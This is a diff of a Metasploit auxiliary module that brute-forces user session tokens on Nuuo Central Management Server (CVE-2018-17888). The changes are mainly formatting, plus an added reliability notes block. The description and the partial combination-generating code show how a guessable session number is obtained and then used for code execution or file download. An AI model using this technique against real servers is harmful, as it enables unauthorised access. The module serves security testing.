@@ -11,34 +11,41 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Nuuo Central Management Server User Session Token Bruteforce',
-      'Description'    => %q{
-        Nuuo Central Management Server below version 2.4 has a flaw where it sends the
-        heap address of the user object instead of a real session number when a user logs
-        in. This can be used to reduce the keyspace for the session number from 10 million
-        to 1.2 million, and with a bit of analysis it can be guessed in less than 500k tries.
-        This module does exactly that - it uses a computed occurrence table to try the most common
-        combinations up to 1.2 million to try to guess a valid user session.
-        This session number can then be used to achieve code execution or download files - see
-        the other Nuuo CMS auxiliary and exploit modules.
-        Note that for this to work a user has to be logged into the system.
-      },
-      'Author'         =>
-        [
-          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module
+    super(
+      update_info(
+        info,
+        'Name' => 'Nuuo Central Management Server User Session Token Bruteforce',
+        'Description' => %q{
+          Nuuo Central Management Server below version 2.4 has a flaw where it sends the
+          heap address of the user object instead of a real session number when a user logs
+          in. This can be used to reduce the keyspace for the session number from 10 million
+          to 1.2 million, and with a bit of analysis it can be guessed in less than 500k tries.
+          This module does exactly that - it uses a computed occurrence table to try the most common
+          combinations up to 1.2 million to try to guess a valid user session.
+          This session number can then be used to achieve code execution or download files - see
+          the other Nuuo CMS auxiliary and exploit modules.
+          Note that for this to work a user has to be logged into the system.
+        },
+        'Author' => [
+          'Pedro Ribeiro <pedrib@gmail.com>' # Vulnerability discovery and Metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2018-17888' ],
           [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-18-284-02' ],
           [ 'URL', 'https://seclists.org/fulldisclosure/2019/Jan/51' ],
           [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/NUUO/nuuo-cms-ownage.txt' ]
 
         ],
-      'Platform'       => ['win'],
-      'DisclosureDate'  => '2018-10-11'))
+        'Platform' => ['win'],
+        'DisclosureDate' => '2018-10-11',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
     deregister_options('SESSION', 'USERNAME', 'PASSWORD')
   end
 
@@ -67,15 +74,14 @@ class MetasploitModule < Msf::Auxiliary
     ['3', '6', '7', 'b', 'e', '9', '2', 'f', '4', '1', 'c', 'a', '0', 'd', '8'],
     ['0', '8']
 
-
   def session_number_list(weighted_array)
     # Let's calculate all the possible combinations
     length = Array.new(weighted_array.length)
-    for i in (0..weighted_array.length-1)
+    for i in (0..weighted_array.length - 1)
       length[i] = weighted_array[i].length
     end
     counter = Array.new(weighted_array.length)
-    for i in (0..weighted_array.length-1)
+    for i in (0..weighted_array.length - 1)
       counter[i] = 0
     end
     total = 1
@@ -101,8 +107,8 @@ class MetasploitModule < Msf::Auxiliary
       # Then we increment the value of the counter so we go on to the next combination.
       for index in (counter.length - 1).downto(0) # From (counter array's length - 1) to 0
         if counter[index] + 1 < length[index] then # If counter index can be incremented
-            counter[index] += 1; # Increment the counter index
-            break; # Stop the incrementation/go to the next combination printing/incrementing.
+          counter[index] += 1; # Increment the counter index
+          break; # Stop the incrementation/go to the next combination printing/incrementing.
         end
         counter[index] = 0; # Assign current counter index to zero and try incrementing the next counter index.
       end
